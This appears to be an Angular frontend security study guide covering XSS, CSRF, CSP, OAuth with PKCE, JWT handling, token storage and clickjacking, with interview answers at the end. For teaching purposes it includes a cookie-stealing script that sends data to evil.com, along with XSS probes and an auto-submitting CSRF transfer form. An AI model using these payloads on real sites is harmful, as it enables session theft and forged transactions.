Security is non-negotiable. XSS, CSRF, auth flows, token management — every senior frontend engineer must understand the attack surface and defense mechanisms.

1. XSS (Cross-Site Scripting) Prevention

Critical

Theory: XSS Attack Types

// ═══ WHAT IS XSS? ═══
// Attacker injects malicious JavaScript into your app
// The script runs in VICTIM's browser with FULL access to their session

// ═══ THREE TYPES ═══

// 1. STORED XSS (Persistent) — Most dangerous
// Attacker saves malicious script in database (comment, profile bio)
// Every user who views the page executes the script
// Example: User submits comment: <script>fetch('evil.com?cookie='+document.cookie)</script>

// 2. REFLECTED XSS
// Malicious script in URL parameter, reflected in response
// Example: https://app.com/search?q=<script>alert(1)</script>

// 3. DOM-BASED XSS
// Vulnerability in client-side JavaScript
// Example: element.innerHTML = location.hash.substring(1);
// URL: https://app.com#<img src=x onerror=alert(1)>

// ═══ WHAT CAN AN ATTACKER DO WITH XSS? ═══
// • Steal cookies (session hijacking)
// • Steal tokens from localStorage
// • Keylog passwords
// • Redirect to phishing site
// • Make API calls as the user
// • Deface the website
// • Install crypto miners

Angular's Built-in XSS Protection

// Angular automatically SANITIZES all values bound to DOM!
// This is SAFE by default:

@Component({
  template: `
    <p>{{ userInput }}</p>            <!-- Auto-escaped -->
    <div [innerHTML]="userHtml"></div> <!-- Sanitized (strips scripts) -->
    <a [href]="userUrl">Link</a>      <!-- Sanitized (blocks javascript:) -->
  `
})
export class SafeComponent {
  userInput = '<script>alert("XSS")</script>';
  // Rendered as TEXT: &lt;script&gt;alert("XSS")&lt;/script&gt;
  
  userHtml = '<b>Bold</b><script>evil()</script>';
  // innerHTML renders: <b>Bold</b>  (script STRIPPED!)
  
  userUrl = 'javascript:alert(1)';
  // href sanitized: "unsafe:javascript:alert(1)" (blocked!)
}

// ═══ DANGEROUS: Bypassing Sanitization ═══
// Only do this if you TRUST the source completely:
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

// DANGER — only use for content YOU control:
trustedHtml = this.sanitizer.bypassSecurityTrustHtml(htmlFromCMS);
trustedUrl = this.sanitizer.bypassSecurityTrustResourceUrl(iframeUrl);

// ═══ NEVER DO THIS ═══
// ❌ element.innerHTML = userInput;         // Direct DOM manipulation
// ❌ document.write(userData);              // Never use document.write
// ❌ eval(userString);                      // Never eval user data
// ❌ new Function(userString)();            // Same as eval
// ❌ setTimeout(userString, 0);             // String form is eval-like
Angular XSS Gotcha Angular sanitization only works with Angular's template binding syntax. If you use ElementRef.nativeElement.innerHTML = userInput directly, Angular can't protect you! Always use Angular's binding system.

2. CSRF (Cross-Site Request Forgery)

Critical

Theory: How CSRF Works

// ═══ THE ATTACK ═══
// User is logged into bank.com (has session cookie)
// User visits evil.com which has:
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
// OR:
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.getElementById('f').submit();</script>

// Browser automatically sends bank.com cookies with the request!
// Server thinks it's a legitimate request from the user!

// ═══ DEFENSES ═══

// 1. CSRF TOKEN (Synchronizer Token Pattern):
// Server generates random token, embeds in form/header
// Token NOT in cookies, so attacker can't include it
// Server validates token matches on every state-changing request

// 2. SameSite Cookies:
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
// SameSite=Strict: Cookie NEVER sent cross-origin (safest)
// SameSite=Lax: Sent on top-level navigation (GET only)
// SameSite=None; Secure: Always sent (needed for cross-origin APIs)

// 3. Double-Submit Cookie Pattern (Angular uses this!)

// ═══ ANGULAR's BUILT-IN CSRF PROTECTION ═══
// Angular HttpClient + server cooperation:
// 1. Server sets a cookie: XSRF-TOKEN=random_value
// 2. Angular's HttpXsrfInterceptor reads XSRF-TOKEN cookie
// 3. Angular adds header: X-XSRF-TOKEN=random_value
// 4. Server compares cookie value to header value
// Attacker can't read the cookie (different origin) → can't set header!

// Configuration:
provideHttpClient(
  withXsrfConfiguration({
    cookieName: 'XSRF-TOKEN',  // default
    headerName: 'X-XSRF-TOKEN' // default
  })
)

3. Content Security Policy (CSP)

Advanced 
// CSP = HTTP header that tells browser WHAT resources are allowed to load
// Strongest defense against XSS (even if injection happens, script won't execute!)

// ═══ EXAMPLE CSP HEADER ═══
Content-Security-Policy:
  default-src 'self';                          // Only same-origin by default
  script-src 'self' 'nonce-abc123';            // Scripts: same-origin + nonce
  style-src 'self' 'unsafe-inline';            // Styles: same-origin + inline
  img-src 'self' https://cdn.example.com;      // Images: self + specific CDN
  font-src 'self' https://fonts.gstatic.com;   // Fonts
  connect-src 'self' https://api.example.com;  // XHR/Fetch/WebSocket
  frame-src 'none';                            // No iframes allowed
  object-src 'none';                           // No plugins (Flash, Java)
  base-uri 'self';                             // Prevent base tag hijacking
  form-action 'self';                          // Forms only submit to self

// ═══ NONCE-BASED CSP (Recommended for Angular) ═══
// Server generates random nonce per request:
Content-Security-Policy: script-src 'nonce-rAnd0m123'

// HTML includes nonce on legitimate scripts:
<script nonce="rAnd0m123" src="/main.js"></script>

// Injected scripts DON'T have the nonce → BLOCKED!
<script>evil()</script>  // ❌ No nonce → CSP blocks it!

// ═══ CSP REPORT-ONLY MODE (Testing) ═══
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
// Doesn't block, just reports violations → use to test before enforcing

// ═══ ANGULAR-SPECIFIC CSP CONSIDERATIONS ═══
// Angular uses inline styles for some features → need 'unsafe-inline' for styles
// OR use nonce: Angular 16+ supports CSP nonce via:
// In index.html: <style nonce="serverNonce">
// Angular will use same nonce for dynamically created styles

4. OAuth 2.0 & OpenID Connect (OIDC)

Critical

Theory: OAuth 2.0 Flows

// ═══ OAUTH 2.0 = AUTHORIZATION (what can you access?) ═══
// ═══ OIDC = AUTHENTICATION (who are you?) — built on OAuth 2.0 ═══

// ═══ Authorization Code Flow with PKCE (Recommended for SPAs) ═══
// PKCE = Proof Key for Code Exchange (prevents code interception)

┌──────────┐                          ┌─────────────────┐
│  Angular  │                          │  Auth Server     │
│   App     │                          │ (Okta/Auth0/AAD)│
└─────┬────┘                          └────────┬────────┘
      │                                        │
      │ 1. Generate code_verifier (random)      │
      │    + code_challenge (SHA256 hash)       │
      │                                        │
      │ 2. Redirect to /authorize              │
      │    ?response_type=code                 │
      │    &client_id=xxx                      │
      │    &redirect_uri=https://app/callback  │
      │    &scope=openid profile email         │
      │    &code_challenge=abc123              │
      │    &code_challenge_method=S256         │
      ├───────────────────────────────────────→│
      │                                        │
      │         3. User logs in                │
      │                                        │
      │←──────── 4. Redirect back ─────────────┤
      │    /callback?code=AUTH_CODE            │
      │                                        │
      │ 5. POST /token                         │
      │    { code, code_verifier, client_id }  │
      ├───────────────────────────────────────→│
      │                                        │
      │←──── 6. { access_token, id_token,  ────┤
      │           refresh_token }              │
      │                                        │

// WHY PKCE?
// Without PKCE: attacker could intercept auth code from URL
// With PKCE: need code_verifier (stored in memory) to exchange code
// Only the app that initiated the flow can complete it!

// ═══ TOKENS EXPLAINED ═══
// access_token:  Short-lived (15min). Sent to API for authorization.
// id_token:      Contains user info (name, email). Verify on client.
// refresh_token: Long-lived. Used to get new access_token silently.

5. JWT (JSON Web Tokens)

Intermediate 
// JWT = base64(header).base64(payload).signature

// ═══ STRUCTURE ═══
// Header:
{ "alg": "RS256", "typ": "JWT" }

// Payload (claims):
{
  "sub": "user123",          // Subject (user ID)
  "name": "Sid R",           // Custom claim
  "email": "sid@example.com",
  "roles": ["admin", "user"],
  "iat": 1700000000,         // Issued at
  "exp": 1700000900,         // Expires (15 min)
  "iss": "https://auth.example.com",  // Issuer
  "aud": "https://api.example.com"    // Audience
}

// Signature: RS256(base64(header) + "." + base64(payload), privateKey)

// ═══ IMPORTANT SECURITY RULES ═══
// 1. NEVER store sensitive data in JWT payload (it's just base64, not encrypted!)
// 2. ALWAYS verify signature on server before trusting claims
// 3. ALWAYS check exp (expiration) before using
// 4. Use short expiration (15min) + refresh tokens
// 5. Use RS256 (asymmetric) not HS256 (symmetric) for public APIs

// ═══ Angular JWT Handling ═══
// Decode JWT without library (for display only, NOT for security):
function decodeJwt(token: string): any {
  const payload = token.split('.')[1];
  return JSON.parse(atob(payload));
}

// Check if expired:
function isTokenExpired(token: string): boolean {
  const decoded = decodeJwt(token);
  return decoded.exp * 1000 < Date.now();
}

6. Secure Token Storage

Critical

// ═══ RECOMMENDED PATTERN (BFF + HttpOnly Cookies) ═══
// Best security: Backend-for-Frontend handles tokens

// Flow:
// 1. Angular app → BFF (same origin) → Auth Server
// 2. BFF stores tokens in HttpOnly, Secure, SameSite=Strict cookies
// 3. Angular never sees the tokens! (No XSS risk)
// 4. BFF attaches token to upstream API calls

// ═══ ALTERNATIVE: In-Memory + Refresh Token Rotation ═══
@Injectable({ providedIn: 'root' })
export class TokenService {
  // Access token in MEMORY only (not localStorage!):
  private accessToken: string | null = null;
  
  // Refresh token in HttpOnly cookie (set by server)
  // Angular can't read it, but it's auto-sent on /refresh endpoint
  
  getAccessToken(): string | null {
    if (this.accessToken && !this.isExpired(this.accessToken)) {
      return this.accessToken;
    }
    return null;
  }
  
  setAccessToken(token: string) {
    this.accessToken = token;
  }
  
  // Silent refresh (using HttpOnly refresh cookie):
  refreshToken(): Observable<string> {
    return this.http.post<{ accessToken: string }>(
      '/api/auth/refresh',
      {},
      { withCredentials: true }  // Send HttpOnly cookie
    ).pipe(
      tap(res => this.accessToken = res.accessToken),
      map(res => res.accessToken)
    );
  }
  
  private isExpired(token: string): boolean {
    const payload = JSON.parse(atob(token.split('.')[1]));
    return payload.exp * 1000 < Date.now() - 30000; // 30s buffer
  }
}

// ═══ TOKEN REFRESH INTERCEPTOR ═══
export const tokenRefreshInterceptor: HttpInterceptorFn = (req, next) => {
  const tokenService = inject(TokenService);
  const token = tokenService.getAccessToken();
  
  if (token) {
    req = req.clone({ setHeaders: { Authorization: `Bearer ${token}` } });
  }
  
  return next(req).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401 && !req.url.includes('/refresh')) {
        // Token expired → refresh and retry:
        return tokenService.refreshToken().pipe(
          switchMap(newToken => {
            req = req.clone({ setHeaders: { Authorization: `Bearer ${newToken}` } });
            return next(req);
          }),
          catchError(() => {
            tokenService.logout();
            return throwError(() => error);
          })
        );
      }
      return throwError(() => error);
    })
  );
};

7. Angular Authentication Patterns

Intermediate 
// ═══ ROUTE GUARDS (Functional — Angular 15+) ═══
export const authGuard: CanActivateFn = (route, state) => {
  const auth = inject(AuthService);
  const router = inject(Router);
  
  if (auth.isAuthenticated()) {
    return true;
  }
  
  // Save intended URL for redirect after login:
  router.navigate(['/login'], { queryParams: { returnUrl: state.url } });
  return false;
};

// Role-based guard:
export const roleGuard: CanActivateFn = (route) => {
  const auth = inject(AuthService);
  const requiredRoles = route.data['roles'] as string[];
  return requiredRoles.some(role => auth.hasRole(role));
};

// Usage in routes:
const routes: Routes = [
  { path: 'dashboard', component: DashboardComponent, canActivate: [authGuard] },
  {
    path: 'admin',
    loadComponent: () => import('./admin.component'),
    canActivate: [authGuard, roleGuard],
    data: { roles: ['admin'] }
  }
];

// ═══ AUTH SERVICE ═══
@Injectable({ providedIn: 'root' })
export class AuthService {
  private user = signal<User | null>(null);
  readonly isAuthenticated = computed(() => !!this.user());
  readonly currentUser = this.user.asReadonly();
  
  constructor(private tokenService: TokenService, private router: Router) {
    // Attempt to restore session on app start:
    this.initSession();
  }
  
  private async initSession() {
    try {
      const response = await firstValueFrom(
        this.http.get<User>('/api/auth/me', { withCredentials: true })
      );
      this.user.set(response);
    } catch {
      // Not authenticated
    }
  }
  
  hasRole(role: string): boolean {
    return this.user()?.roles.includes(role) ?? false;
  }
  
  logout() {
    this.http.post('/api/auth/logout', {}, { withCredentials: true }).subscribe();
    this.user.set(null);
    this.tokenService.clearAccessToken();
    this.router.navigate(['/login']);
  }
}

// ═══ APP INITIALIZATION (Check auth on startup) ═══
// app.config.ts:
export const appConfig: ApplicationConfig = {
  providers: [
    provideRouter(routes),
    provideHttpClient(withInterceptors([tokenRefreshInterceptor])),
    {
      provide: APP_INITIALIZER,
      useFactory: () => {
        const auth = inject(AuthService);
        return () => auth.initSession();  // Blocks app until auth check done
      },
      multi: true
    }
  ]
};

8. Clickjacking & iframe Security

Intermediate 
// ═══ CLICKJACKING ═══
// Attacker embeds your app in transparent iframe over fake UI
// User thinks they're clicking a button, but they're clicking your hidden page

// DEFENSE 1: X-Frame-Options header:
X-Frame-Options: DENY              // Never allow framing
X-Frame-Options: SAMEORIGIN        // Only same-origin framing

// DEFENSE 2: CSP frame-ancestors (modern replacement):
Content-Security-Policy: frame-ancestors 'self'  // Only self can frame
Content-Security-Policy: frame-ancestors 'none'  // No framing at all

// DEFENSE 3: JavaScript frame-busting (fallback):
if (window.top !== window.self) {
  window.top.location = window.self.location;  // Break out of iframe
}

// ═══ SANDBOXING IFRAMES (When you embed others) ═══
<iframe
  src="https://third-party.com/widget"
  sandbox="allow-scripts allow-same-origin"
  referrerpolicy="no-referrer"
  loading="lazy"
></iframe>

// sandbox restrictions:
// allow-scripts: Let iframe run JS
// allow-same-origin: Allow access to its own origin's storage
// allow-forms: Allow form submissions
// allow-popups: Allow window.open
// OMIT all: most restrictive (no JS, no forms, no storage)

12. Interview Questions (Previously Asked)

Q1: What is XSS? How does Angular prevent it? Can it still happen? (All companies)

Answer: XSS = injecting malicious scripts into trusted sites. Three types: Stored (DB), Reflected (URL), DOM-based (client JS). Angular prevents by: auto-escaping interpolation {{ }}, sanitizing innerHTML/href/style bindings, blocking javascript: URLs. Can STILL happen if: (1) using bypassSecurityTrust* incorrectly, (2) direct DOM manipulation via nativeElement, (3) dynamically creating script elements, (4) using third-party libraries that bypass Angular's rendering. Defense-in-depth: also use CSP headers.

Q2: Where should you store JWT tokens in a browser? (Amazon, Flipkart, Google)

Answer: NEVER in localStorage (XSS can read it). Best options: (1) BFF pattern: backend stores tokens in HttpOnly + Secure + SameSite=Strict cookies. Frontend never sees token. (2) In-memory variable for access token (short-lived, lost on refresh) + HttpOnly cookie for refresh token. (3) If using cookies: must add CSRF protection. The BFF pattern is most secure for SPAs because it eliminates token exposure to JavaScript entirely.

Q3: Explain OAuth 2.0 Authorization Code flow with PKCE. Why is PKCE needed for SPAs? (All companies)

Answer: Flow: (1) Generate random code_verifier + SHA256 hash (code_challenge). (2) Redirect to /authorize with code_challenge. (3) User authenticates. (4) Redirect back with auth code. (5) POST /token with code + code_verifier. (6) Server verifies SHA256(code_verifier) matches stored challenge. Why PKCE? SPAs can't keep client_secret (source is public). Without PKCE, attacker intercepting auth code from URL/redirect could exchange it for tokens. With PKCE, only the app that started the flow has the code_verifier needed to complete it.

Q4: How do you handle token refresh in Angular? What about concurrent requests? (Microsoft, Amazon)

Answer: Interceptor catches 401 → calls /refresh endpoint → retries original request with new token. Critical: QUEUE concurrent requests! If 5 requests fail simultaneously, don't send 5 refresh calls. Solution: use a BehaviorSubject to gate retries. First 401 triggers refresh, others wait on the BehaviorSubject. When refresh completes, BehaviorSubject emits new token, all waiting requests retry. If refresh fails: logout user, redirect to login with returnUrl.

Q5: What is CSRF and how does Angular handle it? (All companies)

Answer: CSRF tricks authenticated users into making unintended requests (cookie auto-attached by browser). Angular uses Double-Submit Cookie pattern: (1) Server sets XSRF-TOKEN cookie. (2) HttpClient reads cookie value. (3) Adds X-XSRF-TOKEN header on every mutating request. (4) Server compares cookie to header. Works because: attacker on different origin can't read our cookies (SOP), so can't set the header. Also: use SameSite=Strict cookies as defense-in-depth.

Q6: Design the authentication architecture for a large Angular enterprise app. (Senior level)

Answer: Architecture: (1) OIDC with corporate IdP (Okta/Azure AD) via Authorization Code + PKCE. (2) BFF layer handles token exchange and storage (HttpOnly cookies). (3) Angular guards: functional canActivate for auth + role-based. (4) APP_INITIALIZER checks session on app boot. (5) Interceptor handles 401 → silent refresh → retry queue. (6) Role/permission-based UI: structural directive *hasPermission="'edit'". (7) Idle timeout: warn at 25min, logout at 30min. (8) Multi-tab sync: BroadcastChannel API for logout propagation. (9) CSP + security headers. (10) Audit logging for sensitive actions.
